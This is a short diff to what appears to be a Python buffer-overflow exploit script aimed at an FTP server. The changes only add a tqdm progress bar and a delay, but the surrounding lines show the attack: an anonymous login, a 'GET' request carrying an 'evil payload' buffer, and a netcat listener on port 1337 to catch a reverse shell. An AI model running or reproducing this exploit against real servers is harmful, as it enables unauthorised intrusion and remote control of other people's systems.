@@ -17,6 +17,7 @@ import sys
 import time
 import struct
 import subprocess
+from tqdm import tqdm
 
 try:
     server = str(sys.argv[1])
@@ -75,6 +76,8 @@ try:
     s.send('PASS anonymous\r\n')
     s.recv(1024)
     print("Sending evil payload")
+    for i in tqdm(range(5)):
+        time.sleep(2)
     s.send('GET ' + buffer + '\r\n')
     print("Incoming revshell")
     subprocess.call(['nc -lvp 1337'], shell=True)
